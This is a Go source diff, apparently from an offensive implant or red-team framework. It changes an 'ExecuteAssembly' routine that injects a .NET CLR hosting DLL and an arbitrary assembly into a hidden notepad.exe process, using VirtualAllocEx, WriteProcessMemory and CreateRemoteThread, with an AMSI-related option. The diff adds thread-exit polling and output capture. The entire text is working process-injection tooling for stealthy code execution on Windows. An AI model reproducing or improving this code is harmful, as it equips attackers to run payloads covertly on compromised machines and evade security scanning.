@@ -5,7 +5,6 @@ package assembly
 import (
 	"bytes"
 	"fmt"
-	"io"
 	"log"
 	"os"
 	"os/exec"
@@ -27,6 +26,7 @@ var (
 	procVirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
 	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
 	procCreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
+  procGetExitCodeThread  = kernel32.MustFindProc("GetExitCodeThread")
 )
 
 func virtualAllocEx(process syscall.Handle, addr uintptr, size, allocType, protect uint32) (uintptr, error) {
@@ -75,6 +75,18 @@ func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, 
 	return syscall.Handle(r1), threadID, nil
 }
 
+
+func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
+	var exitCode uint32
+	r1, _, e1 := procGetExitCodeThread.Call(
+		uintptr(threadHandle),
+		uintptr(unsafe.Pointer(&exitCode)))
+	if r1 == 0 {
+		return exitCode, e1
+	}
+	return exitCode, nil
+}
+
 // ExecuteAssembly loads a .NET CLR hosting DLL inside a notepad.exe process
 // along with a provided .NET assembly to execute.
 func ExecuteAssembly(hostingDll, assembly []byte, params string, amsi bool) error {
@@ -91,10 +103,9 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, amsi bool) erro
 		HideWindow: true,
 	}
 	var stdoutBuf, stderrBuf bytes.Buffer
-	stdoutIn, _ := cmd.StdoutPipe()
-	//stderrIn, _ := cmd.StderrPipe()
+	cmd.Stdout = &stdoutBuf
+	cmd.Stderr = &stderrBuf
 
-	var errStdout, errStderr error
 	cmd.Start()
 	pid := cmd.Process.Pid
 
@@ -154,18 +165,20 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, amsi bool) erro
 	if err != nil {
 		return err
 	}
-
-	go func() {
-		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
-	}()
-
-	// With this uncommented it hangs.
-//	_, errStderr = io.Copy(&stderrBuf, stderrIn)
-
-	if errStdout != nil || errStderr != nil {
-		log.Fatal("failed to capture stdout or stderr\n")
+	log.Println("Got thread handle:", threadHandle)
+	for {
+		code, err := getExitCodeThread(threadHandle)
+		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
+			log.Fatalln(err.Error())
+		}
+		if code == 259 {
+			time.Sleep(1000 * time.Millisecond)
+		} else {
+			break
+		}
 	}
-	outStr, errStr := string(stdoutBuf.Bytes()), string(stderrBuf.Bytes())
+	cmd.Process.Kill()
+	outStr, errStr := stdoutBuf.String(), stderrBuf.String()
 	fmt.Printf("\nout:\n%s\nerr:\n%s\n", outStr, errStr)
 	return nil
 }
